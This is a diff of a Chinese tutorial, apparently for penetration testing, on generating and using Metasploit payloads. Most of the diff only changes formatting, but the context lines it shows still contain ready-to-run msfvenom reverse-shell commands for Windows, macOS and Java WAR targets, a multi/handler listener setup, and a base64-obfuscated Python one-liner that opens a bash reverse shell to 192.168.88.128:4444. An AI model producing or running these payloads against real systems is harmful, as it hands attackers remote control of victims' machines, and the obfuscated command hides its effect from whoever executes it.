@@ -15,7 +15,7 @@
 关于二进制文件，主要介绍适用于Windows、linux、mac操作系统的payload生成与利用。
 
 
-```
+```shell
 Windows
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
 
@@ -33,13 +33,13 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port t
 
 `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.88.128 LPORT=4444 -f exe > shell.exe`
 
- 
+> 记得一定要把 lhost lport 都填全
 -----
 
  
 复制`shell.exe`到`Windows`机器，然后`kali`下开启`msf`使用如下命令监听`4444`端口：
 
-```
+```shell
 msfconsole
 
 use exploit/multi/handler
@@ -86,7 +86,7 @@ cmd下运行exe
 - WAR
 `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war`
 
-------
+---------------------
 ## 利用
 
 下面以php为例做一下测试，使用以下命令生成一个webshell：
@@ -95,7 +95,7 @@ cmd下运行exe
 
  
 在kali上使用msf执行下面的命令，监听端口4444：
-```
+```shell
 msfconsole
 
 use exploit/multi/handler
@@ -144,7 +144,7 @@ exploit -j -z
  
 在kali上使用msf执行下面的命令，监听端口4444：
 
-```
+```shell
 msfconsole
 
 use exploit/multi/handler
@@ -161,7 +161,8 @@ exploit -j -z
 ```
  
 然后复制`shell.py`中的内容在linux命令行下执行，如下：
-```
+
+```python
 python -c "exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))"
 ```
  
